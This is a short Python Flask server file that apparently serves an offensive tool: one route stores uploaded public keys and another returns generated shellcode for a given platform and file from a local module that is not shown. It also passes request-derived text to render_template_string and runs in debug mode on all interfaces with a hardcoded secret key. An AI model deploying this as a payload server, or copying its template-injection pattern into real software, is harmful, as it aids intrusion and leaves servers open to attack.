from asyncore import write
from crypt import methods
import random
from flask import Flask, render_template,request,send_from_directory,jsonify,json,make_response,session,redirect,render_template_string
import hashlib
import os
from datetime import timedelta
import lib.generate_shellcode as generate_shellcode

app = Flask(__name__,template_folder='.')
app.config['SEND_FILE_MAX_AGE_DEFAULT']=timedelta(seconds=1)
app.secret_key = "Du4t"

# Creating simple Routes 
@app.route('/',methods=['POST'])
def log_publickey():
    RandomStr=''.join(random.sample('zyxwvutsrqponmlkjihgfedcba',5))
    Filename=RandomStr+'.pem'
    FilePath="./pubkey/"+Filename
    with open(FilePath,'w') as f:
        f.write(request.form['pubkey'])
        f.close
    return render_template_string(RandomStr)

@app.route("/s/<plat>/<filename>",methods=['GET'])
def make_shellcode(plat,filename):
    shellcode=generate_shellcode.generate(plat,filename)
    return render_template_string(str(shellcode))
    





# Make sure this we are executing this file
if __name__ == '__main__':
    app.run(host="0.0.0.0",port=8080,debug=True)
